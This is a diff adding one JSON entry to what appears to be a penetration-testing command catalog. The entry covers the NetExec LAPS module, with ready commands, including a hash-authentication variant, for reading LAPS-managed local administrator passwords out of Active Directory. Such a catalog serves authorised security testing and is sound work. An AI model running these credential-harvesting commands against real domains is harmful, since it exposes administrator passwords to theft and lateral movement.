@@ -1,0 +1,19 @@
+{
+  "id": "nxc-laps",
+  "name": "NetExec LAPS Module (Read ms-MCS-AdmPwd)",
+  "command": "nxc ldap <target> -u '<user>' -p '<password>' -M laps",
+  "description": "Read LAPS-managed local admin passwords from ms-MCS-AdmPwd / msLAPS-Password attributes for every computer the user is permitted to read. Output is a ready-to-use host:user:password list.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["netexec", "nxc", "laps", "ldap", "credentials"],
+  "variations": [
+    { "label": "Hash Auth", "requires": "hash", "command": "nxc ldap <target> -u '<user>' -H '<hash>' -M laps" }
+  ],
+  "references": [
+    { "title": "NetExec laps module", "url": "https://www.netexec.wiki/ldap-protocol/laps" }
+  ],
+  "examples": [
+    "nxc ldap dc.corp.local -u jdoe -p 'Password123!' -M laps"
+  ]
+}
